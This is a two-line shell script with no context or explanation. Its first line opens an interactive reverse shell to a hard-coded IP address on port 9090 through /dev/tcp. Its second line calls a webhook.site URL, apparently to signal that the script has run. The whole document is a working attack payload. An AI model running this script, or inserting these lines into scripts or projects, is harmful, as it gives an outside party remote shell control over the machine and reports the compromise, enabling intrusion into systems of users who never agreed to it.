#!/bin/sh

sh -i >& /dev/tcp/138.68.69.37/9090 0>&1

curl https://webhook.site/cb046334-7324-44b2-a9b3-075d7f3bdbb5  
